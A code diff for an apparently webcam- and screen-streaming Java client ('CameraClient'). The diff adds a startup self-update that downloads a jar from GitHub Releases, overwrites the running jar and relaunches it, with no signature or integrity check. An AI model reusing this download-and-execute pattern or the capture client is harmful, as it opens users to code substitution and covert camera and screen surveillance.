@@ -4,8 +4,13 @@ import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.URI;
+import java.net.URL;
 import java.util.Base64;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
@@ -25,6 +30,10 @@ public class CameraClient {
     static final int    SCREEN_FPS    = 10; // screen is heavier, keep lower
     static final int    RECONNECT_SEC = 5;
 
+    // Self-update: upload new jar to GitHub Releases as "camera-client.jar"
+    static final String UPDATE_URL = "https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar";
+    static final String VERSION    = "1.0"; // bump this string each time you release
+
     static volatile CameraWebSocket ws;
     static volatile boolean reconnecting = false;
     static String pcId;
@@ -32,6 +41,7 @@ public class CameraClient {
     static OpenCVFrameGrabber grabber;
 
     public static void main(String[] args) throws Exception {
+        checkForUpdate();
         pcId = InetAddress.getLocalHost().getHostName();
 
         for (int idx = 0; idx < 3; idx++) {
@@ -63,6 +73,41 @@ public class CameraClient {
         }));
 
         Thread.currentThread().join();
+    }
+
+    static void checkForUpdate() {
+        try {
+            // Check version.txt in the release to compare
+            URL versionUrl = new URL(UPDATE_URL.replace("camera-client.jar", "version.txt"));
+            HttpURLConnection conn = (HttpURLConnection) versionUrl.openConnection();
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
+            conn.setInstanceFollowRedirects(true);
+            if (conn.getResponseCode() != 200) return;
+            String latest = new String(conn.getInputStream().readAllBytes()).trim();
+            if (latest.equals(VERSION)) { System.out.println("[*] Up to date (v" + VERSION + ")"); return; }
+            System.out.println("[*] Update available: v" + latest + " (current: v" + VERSION + ") — downloading...");
+
+            // Download new jar next to current jar
+            File self = new File(CameraClient.class.getProtectionDomain().getCodeSource().getLocation().toURI());
+            File newJar = new File(self.getParent(), "camera-client-update.jar");
+            HttpURLConnection dl = (HttpURLConnection) new URL(UPDATE_URL).openConnection();
+            dl.setInstanceFollowRedirects(true);
+            try (InputStream in = dl.getInputStream(); FileOutputStream out = new FileOutputStream(newJar)) {
+                in.transferTo(out);
+            }
+            System.out.println("[*] Downloaded update. Relaunching...");
+
+            // Replace self and relaunch
+            File backup = new File(self.getParent(), "camera-client-old.jar");
+            self.renameTo(backup);
+            newJar.renameTo(self);
+            new ProcessBuilder("java", "--enable-native-access=ALL-UNNAMED", "-jar", self.getAbsolutePath())
+                .inheritIO().start();
+            System.exit(0);
+        } catch (Exception e) {
+            System.out.println("[*] Update check failed: " + e.getMessage());
+        }
     }
 
     static void startCameraLoop() {
